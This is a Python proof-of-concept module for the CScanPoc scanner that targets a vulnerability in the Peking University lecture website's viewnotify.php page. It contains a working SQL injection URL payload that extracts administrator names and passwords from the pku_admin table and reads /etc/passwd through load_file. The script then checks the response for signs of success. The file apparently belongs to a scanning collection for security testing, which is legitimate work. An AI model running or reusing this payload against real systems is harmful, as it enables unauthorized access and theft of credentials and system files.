# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Lecture_0101'  # 平台漏洞编号
    name = '北大讲座网SQL文件包含泄漏重要系统文件'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2012-02-06'  # 漏洞公布时间
    desc = '''
    北大讲座网SQL文件包含泄漏重要系统文件
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=4251
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Lecture'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '25a6f711-16ff-4b55-97a5-830c3abe9ba3'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/viewnotify.php?id=4758%20and%201=2%20union%20select%201,2,3,4,5,6,7,8,name,password,11,concat(0x61696D65657875,load_file(0x2f6574632f706173737764),0x61696D65657875),13,14,15,16,17,18,19%20from%20pku_admin%20limit%200,1--"
            url = self.target + payload
            response = requests.get(url)
            if 'root:' in response.text or "/bin/bash" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
